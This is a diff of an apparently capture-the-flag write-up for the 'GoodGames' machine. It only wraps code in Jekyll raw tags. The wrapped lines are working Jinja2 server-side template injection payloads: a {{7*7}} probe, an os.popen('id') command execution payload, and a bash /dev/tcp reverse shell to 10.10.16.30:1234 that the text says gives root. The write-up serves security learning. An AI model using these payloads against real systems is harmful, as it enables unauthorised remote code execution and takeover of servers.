@@ -232,7 +232,11 @@ It's the same python backend. Usually in such scenarios where user input is refl
 
 Let's do a test to identify if SSTI exists or not.
 
-`{{7*7}}`
+```python
+{% raw %}
+{{7*7}}
+{% endraw %}
+```
 
 ![alt text](/assets/images/GoodGames-SSTI.png)
 
@@ -240,7 +244,11 @@ It does exist.
 
 Since this is python it is easy to gather SSTI payload:
 
-`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+```python
+{% raw %}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{% endraw %}
+```
 
 We got the response:
 
@@ -248,7 +256,11 @@ We got the response:
 
 We will just get reverse shell as root. 
 
-`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.30/1234 0>&1"').read() }}`
+```python
+{% raw %}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.30/1234 0>&1"').read() }}
+{% endraw %}
+```
 
 and we have reverse shell as root:
 
